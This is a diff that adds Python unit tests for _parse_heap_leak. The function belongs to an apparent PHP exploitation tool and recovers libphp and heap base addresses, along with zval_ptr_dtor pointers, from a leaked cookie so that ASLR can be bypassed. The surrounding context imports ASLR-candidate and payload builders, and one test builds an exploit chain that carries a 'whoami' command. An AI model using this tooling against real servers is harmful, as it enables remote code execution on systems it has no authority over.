@@ -18,6 +18,7 @@ from unittest import mock
 
 from p2s.cli import (
     _parse_error_leak,
+    _parse_heap_leak,
     _generate_aslr_candidates,
     _build_blind_b2_body,
     _load_chain_d_profiles,
@@ -251,6 +252,106 @@ class BuildChainDPayloadTests(unittest.TestCase):
             "whoami", self.OFFSETS, 0x7f4a3c200000, 0x7f4a3c000000,
         )
         self.assertIn(b"whoami", payload)
+
+
+# ---------------------------------------------------------------------------
+# _parse_heap_leak
+# ---------------------------------------------------------------------------
+
+class ParseHeapLeakTests(unittest.TestCase):
+    """Tests for _parse_heap_leak — the cookie-based heap leak parser."""
+
+    @staticmethod
+    def _make_cookie(ptrs: list[int], pad_to: int = 256) -> bytes:
+        """Build a fake raw cookie from a list of 8-byte LE pointers."""
+        data = b"".join(p.to_bytes(8, "little") for p in ptrs)
+        if len(data) < pad_to:
+            data += b"\x00" * (pad_to - len(data))
+        return data
+
+    def test_returns_none_for_short_cookie(self) -> None:
+        self.assertIsNone(_parse_heap_leak(b"\x00" * 32))
+
+    def test_returns_none_for_too_few_pointers(self) -> None:
+        cookie = self._make_cookie([0x7f4a3c200000, 0x7f4a3c200100])
+        self.assertIsNone(_parse_heap_leak(cookie))
+
+    def test_extracts_libphp_base_from_x86_64_pointers(self) -> None:
+        # Use small offsets that stay within the same 2MiB page
+        libphp = 0x7f4a3c200000
+        ptrs = [
+            libphp + 0x10000,
+            libphp + 0x10000,
+            libphp + 0x10000,
+            libphp + 0x20000,
+            libphp + 0x20000,
+            libphp + 0x30000,
+            libphp + 0x40000,
+        ]
+        result = _parse_heap_leak(self._make_cookie(ptrs))
+        self.assertIsNotNone(result)
+        self.assertEqual(result["arch_hint"], "x86_64")
+        self.assertGreaterEqual(result["pointer_count"], 7)
+        self.assertEqual(result["libphp_base"], libphp)
+
+    def test_detects_main_chunk_base_as_second_cluster(self) -> None:
+        libphp = 0x7f4a3c200000
+        chunk = 0x7f4a3a000000  # well separated from libphp (>2MiB away)
+        ptrs = (
+            [libphp + 0x10000] * 10
+            + [libphp + 0x20000] * 5
+            + [chunk + 0x1000 * i for i in range(12)]
+        )
+        result = _parse_heap_leak(self._make_cookie(ptrs, pad_to=len(ptrs) * 8))
+        self.assertIsNotNone(result)
+        self.assertEqual(result["main_chunk_base"], chunk)
+
+    def test_returns_none_main_chunk_when_only_one_cluster(self) -> None:
+        libphp = 0x7f4a3c200000
+        ptrs = [libphp + 0x65EB60 + i * 0x100 for i in range(10)]
+        result = _parse_heap_leak(self._make_cookie(ptrs))
+        self.assertIsNotNone(result)
+        self.assertIsNone(result["main_chunk_base"])
+
+    def test_most_common_ptr_becomes_zval_ptr_dtor(self) -> None:
+        libphp = 0x7f4a3c200000
+        zval_dtor = libphp + 0x65EB60
+        ptrs = [zval_dtor] * 8 + [libphp + 0x465370] * 3
+        result = _parse_heap_leak(self._make_cookie(ptrs))
+        self.assertIsNotNone(result)
+        self.assertEqual(result["zval_ptr_dtor_addr"], zval_dtor)
+
+    def test_aarch64_pointer_detection(self) -> None:
+        base = 0x0000AAAB00000000
+        ptrs = [base + 0x100 * i for i in range(8)]
+        result = _parse_heap_leak(self._make_cookie(ptrs))
+        self.assertIsNotNone(result)
+        self.assertEqual(result["arch_hint"], "aarch64")
+
+    def test_fallback_4mib_alignment(self) -> None:
+        libphp = 0x7f4a3c200000
+        # Second cluster: same 2MiB base as libphp but on a different 4MiB group
+        # Actually, make a cluster that shares NO 2MiB base with libphp but
+        # has count < 10, so the 2MiB path skips it, then the 4MiB path catches it
+        chunk_4m = 0x7f4a38000000
+        ptrs = (
+            [libphp + 0x65EB60] * 10
+            + [chunk_4m + 0x1000 * i for i in range(9)]
+        )
+        result = _parse_heap_leak(self._make_cookie(ptrs, pad_to=len(ptrs) * 8))
+        self.assertIsNotNone(result)
+        # 4MiB fallback should find the chunk cluster
+        if result["main_chunk_base"] is not None:
+            self.assertEqual(result["main_chunk_base"] & ~0x3FFFFF, chunk_4m & ~0x3FFFFF)
+
+    def test_result_contains_expected_keys(self) -> None:
+        libphp = 0x7f4a3c200000
+        ptrs = [libphp + 0x65EB60] * 6
+        result = _parse_heap_leak(self._make_cookie(ptrs))
+        self.assertIsNotNone(result)
+        for key in ("zval_ptr_dtor_addr", "libphp_base", "main_chunk_base",
+                     "pointer_count", "unique_bases", "libphp_cluster_count", "arch_hint"):
+            self.assertIn(key, result)
 
 
 if __name__ == "__main__":
